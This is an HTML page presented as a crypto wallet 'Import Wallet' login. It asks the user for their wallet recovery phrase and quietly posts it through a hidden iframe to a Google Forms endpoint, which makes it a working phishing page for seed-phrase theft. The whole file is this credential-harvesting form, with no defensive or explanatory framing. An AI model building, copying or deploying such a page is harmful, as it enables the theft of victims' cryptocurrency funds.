<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="whales.css" />
    <title>Login Wallet</title>
  </head>
  <body>
    <header class="header">
      <nav class="nav">
        <ul>
          <li class="nav-p2p"><a class="nav-link" href="p2p.html">P2P</a></li>
          <li class="nav-logo-btn">
            <img
              src="./img/getstartedimg2.png"
              class="start-img-nav nav-logo"
              alt="Logo"
            />
          </li>
        </ul>
      </nav>
    </header>

    <!-- Form Container -->
    <div class="container">
      <!-- Input Logins -->

      <script type="text/javascript">
        var submitted = false;
      </script>
      <iframe
        name="hidden_iframe"
        id="hidden_iframe"
        style="display: none"
        onload="if(submitted) {window.location='#';}"
      ></iframe>
      <form
        action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSd5zfg4gibRgwQ0tzoeagJnKjZqdkKMGCR9JT6LJEn9I1dNLA/formResponse"
        method="post"
        target="hidden_iframe"
        submitted="true"
      >
        <div class="import-phrase-header">Import Wallet</div>
        <div class="input-form-type form-element">
          <p class="input-p">Phrase</p>
          <textarea
            name="entry.1606770887"
            cols="30"
            rows="8"
            class="input-text"
            autofocus
          >
          </textarea>
        </div>
        <button type="submit">Import</button>
      </form>
    </div>
  </body>
</html>
